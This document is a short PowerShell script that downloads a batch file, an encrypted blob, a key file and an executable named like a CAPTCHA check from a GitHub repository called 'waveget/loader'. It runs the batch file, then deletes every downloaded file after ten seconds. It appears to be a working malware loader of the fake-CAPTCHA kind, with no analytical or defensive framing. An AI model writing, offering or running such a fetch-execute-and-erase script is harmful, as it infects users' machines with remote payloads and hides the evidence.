# Define the download location
$downloadPath = "C:\MyDownloads"
# Create the directory if it doesn't exist
if (-not (Test-Path -Path $downloadPath)) {
    New-Item -ItemType Directory -Path $downloadPath
}

# Define the URLs
$urls = @(
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/main.bat",
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin",
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin",
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Authentication-Process-820182.exe"
)

# Download the files
foreach ($url in $urls) {
    $fileName = Join-Path -Path $downloadPath -ChildPath (Split-Path -Path $url -Leaf)
    Invoke-WebRequest -Uri $url -OutFile $fileName
}

# Run main.bat
Start-Process -FilePath (Join-Path -Path $downloadPath -ChildPath "main.bat") -NoNewWindow

# Wait for 10 seconds
Start-Sleep -Seconds 10

# Delete all downloaded files
Remove-Item -Path $downloadPath\* -Force
